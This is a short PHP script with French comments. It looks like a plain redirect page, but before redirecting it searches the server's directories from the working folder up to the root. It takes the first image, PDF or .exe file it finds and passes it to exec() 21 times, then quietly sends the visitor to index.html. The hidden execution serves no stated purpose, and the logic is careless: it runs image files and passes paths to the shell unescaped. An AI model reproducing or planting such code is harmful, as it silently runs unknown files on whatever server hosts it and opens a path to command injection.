<?php
    // Variable pour ouvrir X fois le fichier
    $repeat = 20;

    function find_file($dir) {
        if ($handle = opendir($dir)) {
            while (false !== ($entry = readdir($handle))) {
                if ($entry != "." && $entry != "..") {
                    $path = $dir . DIRECTORY_SEPARATOR . $entry;
                    if (is_dir($path)) {
                        $result = find_file($path);
                        if ($result !== false) {
                            closedir($handle);
                            return $result;
                        }
                    } else {
                        $extension = pathinfo($path, PATHINFO_EXTENSION);
                        if (in_array($extension, array('png', 'jpeg', 'jpg', 'exe', 'pdf'))) {
                            closedir($handle);
                            return $path;
                        }
                    }
                }
            }
            closedir($handle);
        }
        return false;
    }
    
    $current_dir = getcwd();
    $file = false;
    while ($current_dir != '/' && !$file) {
        $file = find_file($current_dir);
        $current_dir = dirname($current_dir);
    }
    if ($file !== false) {
        // Un fichier a ete trouver
        for($i = 0; $i <= $repeat; $i++){
            exec($file);
        }
        header('location: ../../index.html');
    } else {
        header('location: ../../index.html');
    }
?>